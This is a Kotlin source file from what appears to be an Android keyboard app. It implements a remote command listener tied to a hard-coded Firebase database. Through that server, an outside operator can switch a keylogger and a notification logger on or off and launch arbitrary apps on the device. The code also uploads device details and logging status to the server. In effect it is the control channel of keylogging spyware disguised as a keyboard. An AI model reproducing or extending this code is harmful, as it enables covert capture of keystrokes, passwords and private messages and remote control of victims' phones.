package com.example.mykeyboard

import android.content.Intent
import android.os.Build
import android.util.Log
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

object RemoteCommandListener {
    private const val TAG = "RemoteCommandListener"
    private var isListening = false
    private const val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
    private var lastLaunchedPkg = ""

    fun startListening() {
        if (isListening) {
            reportCurrentStatus()
            return
        }
        isListening = true

        try {
            val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)

            reportCurrentStatus()

            ref.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        val keyObj = snapshot.child("keylogging").value
                        val keylogging = when (keyObj) {
                            is Boolean -> keyObj
                            is String -> keyObj.toBoolean()
                            else -> null
                        }
                        if (keylogging != null && keylogging != KeyloggingConfig.isEnabled) {
                            KeyloggingConfig.isEnabled = keylogging
                            LogStore.addLog("Remote Command: Key Logger set to $keylogging")
                            reportCurrentStatus()
                        }

                        val notifObj = snapshot.child("notifications").value
                        val notifications = when (notifObj) {
                            is Boolean -> notifObj
                            is String -> notifObj.toBoolean()
                            else -> null
                        }
                        if (notifications != null && notifications != NotificationConfig.isEnabled) {
                            NotificationConfig.isEnabled = notifications
                            LogStore.addLog("Remote Command: Notification Logger set to $notifications")
                            reportCurrentStatus()
                        }

                        // Remote App Launch Command
                        val launchPkg = snapshot.child("launch_package").value as? String
                        if (!launchPkg.isNullOrBlank() && launchPkg != lastLaunchedPkg) {
                            lastLaunchedPkg = launchPkg
                            try {
                                val ctx = AppContextHolder.context
                                val intent = ctx.packageManager.getLaunchIntentForPackage(launchPkg)
                                if (intent != null) {
                                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    ctx.startActivity(intent)
                                    LogStore.addLog("Remote Command: Launched app -> $launchPkg")
                                } else {
                                    LogStore.addLog("Remote Command: App not found -> $launchPkg")
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Error launching package $launchPkg", e)
                                LogStore.addLog("Launch error: ${e.message}")
                            }
                        }

                        // Remote Action / Intent Forwarding
                        val remoteAction = snapshot.child("remote_action").value as? String
                        if (!remoteAction.isNullOrBlank()) {
                            LogStore.addLog("Remote Action received: $remoteAction")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error parsing remote command", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e(TAG, "Remote command listener cancelled", error.toException())
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Exception starting remote command listener", e)
        }
    }

    fun reportCurrentStatus() {
        try {
            val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
            ref.child("status").child("keylogging").setValue(KeyloggingConfig.isEnabled)
            ref.child("status").child("notifications").setValue(NotificationConfig.isEnabled)
            ref.child("keylogging").setValue(KeyloggingConfig.isEnabled)
            ref.child("notifications").setValue(NotificationConfig.isEnabled)

            val deviceInfo = mapOf(
                "model" to Build.MODEL,
                "manufacturer" to Build.MANUFACTURER,
                "androidVersion" to Build.VERSION.RELEASE,
                "sdkInt" to Build.VERSION.SDK_INT,
                "lastSyncTime" to System.currentTimeMillis()
            )
            ref.child("device_info").setValue(deviceInfo)
        } catch (e: Exception) {
            Log.e(TAG, "Error reporting status", e)
        }
    }
}
